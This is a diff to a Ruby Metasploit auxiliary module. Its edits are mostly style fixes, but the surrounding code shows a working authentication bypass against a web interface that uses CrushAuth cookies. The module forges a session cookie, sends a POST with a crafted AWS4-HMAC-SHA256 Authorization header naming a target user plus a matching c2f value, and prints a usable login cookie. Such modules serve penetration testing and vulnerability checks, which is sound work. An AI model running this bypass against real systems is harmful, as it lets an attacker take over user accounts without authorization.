@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     res_bypass = perform_auth_bypass(datastore['TARGETUSER'], user_cookie)
 
     # Confirm that the target returns an empty response, otherwise it shouldn't be vulnerable
-    fail_with(Failure::NotVulnerable, 'The target unexpectedly returned a response') unless !res_bypass
+    fail_with(Failure::NotVulnerable, 'The target unexpectedly returned a response') if res_bypass
 
     print_good('The target returned the expected empty response and is likely vulnerable')
 
@@ -81,7 +81,6 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_good("Authentication bypass succeeded! Cookie string generated\nCookie: CrushAuth=#{user_cookie}; currentAuth=#{user_cookie.to_s[-4..]}\n")
-
   end
 
   # A GET request to /WebInterface/ should return a 404 response that contains an 'anonymous' user cookie
@@ -94,27 +93,27 @@ class MetasploitModule < Msf::Auxiliary
 
   def generate_fake_cookie
     current_timestamp = Time.now.to_i
-    random_string = Rex::Text::rand_text_alphanumeric(30)
+    random_string = Rex::Text.rand_text_alphanumeric(30)
     "#{current_timestamp}_#{random_string}"
   end
 
   # Make a request to the getUsername web API with the malicious bypass header
   def perform_auth_bypass(username, cookie)
     send_request_cgi(
-       {
+      {
         'method' => 'POST',
         'uri' => normalize_uri(target_uri.path, 'WebInterface', 'function/'),
         'cookie' => "CrushAuth=#{cookie}",
         'headers' => {
           'Connection' => 'close',
           'Authorization' => "AWS4-HMAC-SHA256 Credential=#{username}/"
-          },
+        },
         'vars_post' => {
           'command' => 'getUsername',
           # The c2f parameter must be the last four characters of the primary session cookie
           'c2f' => cookie.to_s[-4..]
         }
-        }
-      )
+      }
+    )
   end
 end
